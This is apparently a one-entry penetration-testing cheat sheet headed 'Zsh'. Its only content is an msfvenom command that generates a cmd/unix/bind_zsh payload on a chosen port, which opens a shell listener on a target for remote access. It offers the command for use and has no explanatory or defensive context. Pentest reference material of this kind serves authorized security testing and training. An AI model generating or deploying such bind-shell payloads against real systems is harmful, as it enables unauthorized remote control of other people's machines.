# Zsh

## 01 - Generate a payload via `msfvenom`

```
$ msfvenom -p cmd/unix/bind_zsh lport=<PORT>
```